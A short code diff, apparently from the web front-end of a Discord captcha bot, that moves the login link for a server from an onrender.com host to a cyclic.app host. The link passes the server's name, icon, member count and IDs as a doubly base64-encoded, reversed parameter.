@@ -380,7 +380,7 @@
     if (guildId && clientId) {
       for (const loginBtn of loginBtns) {
         loginBtn.setAttribute('href',
-          `https://captcha-bot-auth-z7c9.onrender.com/login/?from=${[...btoa(btoa(JSON.stringify({icon, members, name, clientId, guildId })))].reverse().join('')}`
+          `https://captcha-bot.cyclic.app/login/?from=${[...btoa(btoa(JSON.stringify({icon, members, name, clientId, guildId })))].reverse().join('')}`
         );
       }
     }
